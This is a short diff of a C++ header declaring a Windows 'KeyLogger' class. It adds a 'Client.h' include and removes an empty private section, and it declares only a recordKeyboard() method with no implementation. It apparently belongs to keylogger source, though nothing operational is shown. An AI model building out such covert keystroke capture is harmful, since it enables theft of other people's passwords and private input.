@@ -4,7 +4,7 @@
 #include <Windows.h>
 #include <iostream>
 #include <thread>
-
+#include "Client.h"
 
 class KeyLogger
 {
@@ -13,7 +13,4 @@ public:
 	~KeyLogger();
 
 	void recordKeyboard();
-
-private:
-
 };
